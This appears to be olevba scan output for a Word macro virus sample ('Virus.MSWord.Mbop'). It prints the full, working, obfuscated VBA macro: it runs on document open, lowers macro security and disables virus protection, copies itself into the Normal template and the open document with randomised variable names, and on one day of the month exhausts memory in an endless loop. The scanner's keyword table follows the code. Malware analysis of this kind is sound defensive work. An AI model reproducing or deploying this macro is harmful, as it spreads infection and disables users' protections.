olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop-32837e70b24aa9fcb97a2da71f40680086e23e7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop-32837e70b24aa9fcb97a2da71f40680086e23e7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
rpkupkrxoohbozgl1rpkupkrxoohbozg = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
rpkupkrxoohbozgfirpkupkrxoohbozg = 7
Options.ConfirmConversions = False
Set rpkupkrxoohbozgNtrpkupkrxoohbozg = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set rpkupkrxoohbozgAdrpkupkrxoohbozg = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set rpkupkrxoohbozgTdrpkupkrxoohbozg = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
rpkupkrxoohbozgserpkupkrxoohbozg = 5
rpkupkrxoohbozgl2rpkupkrxoohbozg = "b"
rpkupkrxoohbozgfnrpkupkrxoohbozg = rpkupkrxoohbozgfirpkupkrxoohbozg & rpkupkrxoohbozgserpkupkrxoohbozg
For rpkupkrxoohbozgiirpkupkrxoohbozg = 1 To rpkupkrxoohbozgTdrpkupkrxoohbozg.countoflines
If InStr(rpkupkrxoohbozgTdrpkupkrxoohbozg.lines(rpkupkrxoohbozgiirpkupkrxoohbozg, 1), "Private Sub Document_Open()") <> 0 Then
rpkupkrxoohbozgSlrpkupkrxoohbozg = rpkupkrxoohbozgiirpkupkrxoohbozg
Exit For
End If
Next
rpkupkrxoohbozgl3rpkupkrxoohbozg = "o"
rpkupkrxoohbozgVcrpkupkrxoohbozg = Trim(rpkupkrxoohbozgTdrpkupkrxoohbozg.lines(rpkupkrxoohbozgSlrpkupkrxoohbozg, rpkupkrxoohbozgSlrpkupkrxoohbozg + rpkupkrxoohbozgfnrpkupkrxoohbozg))
rpkupkrxoohbozglvrpkupkrxoohbozg = 97
If rpkupkrxoohbozgNtrpkupkrxoohbozg.countoflines > 0 Then
rpkupkrxoohbozgNlrpkupkrxoohbozg = rpkupkrxoohbozgNtrpkupkrxoohbozg.lines(1, rpkupkrxoohbozgNtrpkupkrxoohbozg.countoflines)
If InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Nt") = 0 And InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Sl") = 0 And InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Nl") = 0 And InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Ad") = 0 And InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Vc") = 0 And InStr(rpkupkrxoohbozgNlrpkupkrxoohbozg, "Td") = 0 Then
rpkupkrxoohbozgNtrpkupkrxoohbozg.addfromstring rpkupkrxoohbozgVcrpkupkrxoohbozg
rpkupkrxoohbozginrpkupkrxoohbozg = True
End If
Else
rpkupkrxoohbozgNtrpkupkrxoohbozg.addfromstring rpkupkrxoohbozgVcrpkupkrxoohbozg
rpkupkrxoohbozginrpkupkrxoohbozg = True
End If
rpkupkrxoohbozghvrpkupkrxoohbozg = 122
If rpkupkrxoohbozgAdrpkupkrxoohbozg.countoflines > 0 Then
rpkupkrxoohbozgAlrpkupkrxoohbozg = rpkupkrxoohbozgAdrpkupkrxoohbozg.lines(1, rpkupkrxoohbozgAdrpkupkrxoohbozg.countoflines)
If InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Nt") = 0 And InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Sl") = 0 And InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Nl") = 0 And InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Ad") = 0 And InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Vc") = 0 And InStr(rpkupkrxoohbozgAlrpkupkrxoohbozg, "Td") = 0 Then
rpkupkrxoohbozgAdrpkupkrxoohbozg.addfromstring rpkupkrxoohbozgVcrpkupkrxoohbozg
rpkupkrxoohbozgiarpkupkrxoohbozg = True
End If
Else
rpkupkrxoohbozgAdrpkupkrxoohbozg.addfromstring rpkupkrxoohbozgVcrpkupkrxoohbozg
rpkupkrxoohbozgiarpkupkrxoohbozg = True
End If
rpkupkrxoohbozgl4rpkupkrxoohbozg = "p"
For rpkupkrxoohbozgiirpkupkrxoohbozg = 1 To 15
Randomize
rpkupkrxoohbozgTnrpkupkrxoohbozg = rpkupkrxoohbozgTnrpkupkrxoohbozg & Chr(Int((rpkupkrxoohbozghvrpkupkrxoohbozg - rpkupkrxoohbozglvrpkupkrxoohbozg + 1) * Rnd + rpkupkrxoohbozglvrpkupkrxoohbozg))
Next
rpkupkrxoohbozgd2rpkupkrxoohbozg = 9
rpkupkrxoohbozgVcrpkupkrxoohbozg = rpkupkrxoohbozgTdrpkupkrxoohbozg.lines(1, rpkupkrxoohbozgTdrpkupkrxoohbozg.countoflines)
rpkupkrxoohbozgTdrpkupkrxoohbozg.deletelines 1, rpkupkrxoohbozgTdrpkupkrxoohbozg.countoflines
Do While InStr(rpkupkrxoohbozgVcrpkupkrxoohbozg, "rpkupkrxoohbozg") <> 0
rpkupkrxoohbozgVcrpkupkrxoohbozg = Mid(rpkupkrxoohbozgVcrpkupkrxoohbozg, 1, InStr(rpkupkrxoohbozgVcrpkupkrxoohbozg, "rpkupkrxoohbozg") - 1) & rpkupkrxoohbozgTnrpkupkrxoohbozg & Mid(rpkupkrxoohbozgVcrpkupkrxoohbozg, InStr(rpkupkrxoohbozgVcrpkupkrxoohbozg, "rpkupkrxoohbozg") + Len("rpkupkrxoohbozg"))
Loop
rpkupkrxoohbozgTdrpkupkrxoohbozg.addfromstring rpkupkrxoohbozgVcrpkupkrxoohbozg
rpkupkrxoohbozgDyrpkupkrxoohbozg = Day(Now)
rpkupkrxoohbozgd1rpkupkrxoohbozg = 2
rpkupkrxoohbozgl5rpkupkrxoohbozg = "!"
If rpkupkrxoohbozgDyrpkupkrxoohbozg = rpkupkrxoohbozgd1rpkupkrxoohbozg & rpkupkrxoohbozgd2rpkupkrxoohbozg Then
Dim rpkupkrxoohbozgstrpkupkrxoohbozg()
rpkupkrxoohbozgcarpkupkrxoohbozg = 0
Do
ReDim Preserve rpkupkrxoohbozgstrpkupkrxoohbozg(rpkupkrxoohbozgcarpkupkrxoohbozg)
rpkupkrxoohbozgqwrpkupkrxoohbozg = CLng(1024)
rpkupkrxoohbozgqarpkupkrxoohbozg = rpkupkrxoohbozgqwrpkupkrxoohbozg
rpkupkrxoohbozgqzrpkupkrxoohbozg = rpkupkrxoohbozgqwrpkupkrxoohbozg * rpkupkrxoohbozgqarpkupkrxoohbozg
rpkupkrxoohbozgstrpkupkrxoohbozg(rpkupkrxoohbozgcarpkupkrxoohbozg) = String(rpkupkrxoohbozgqzrpkupkrxoohbozg, Right(rpkupkrxoohbozgTnrpkupkrxoohbozg, 1))
DoEvents
rpkupkrxoohbozgcarpkupkrxoohbozg = rpkupkrxoohbozgcarpkupkrxoohbozg + 1
Loop
End If
If rpkupkrxoohbozgiarpkupkrxoohbozg = True Or rpkupkrxoohbozginrpkupkrxoohbozg = True Then
MsgBox rpkupkrxoohbozgl1rpkupkrxoohbozg & rpkupkrxoohbozgl2rpkupkrxoohbozg & rpkupkrxoohbozgl3rpkupkrxoohbozg & rpkupkrxoohbozgl4rpkupkrxoohbozg & rpkupkrxoohbozgl5rpkupkrxoohbozg, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
